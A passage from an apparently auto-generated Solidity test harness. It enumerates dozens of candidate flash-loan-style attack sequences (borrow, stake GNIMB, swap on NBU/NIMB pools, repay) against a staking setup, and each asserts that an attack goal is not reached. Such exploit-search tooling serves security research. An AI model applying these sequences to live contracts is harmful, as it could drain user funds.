        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand645(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand646(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand647(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand648(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand649(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand650(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand651(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand652(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand653(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand654(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand655(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand656(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand657(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand658(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand659(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nbu_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand660(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand661(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand662(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand663(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand664(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand665(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand666(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand667(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand668(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand669(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand670(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand671(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand672(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand673(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand674(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand675(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand676(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand677(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand678(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand679(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand680(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand681(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand682(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand683(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand684(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand685(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand686(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand687(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand688(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand689(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand690(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand691(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand692(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand693(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand694(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand695(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand696(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand697(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand698(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand699(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_nbu_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
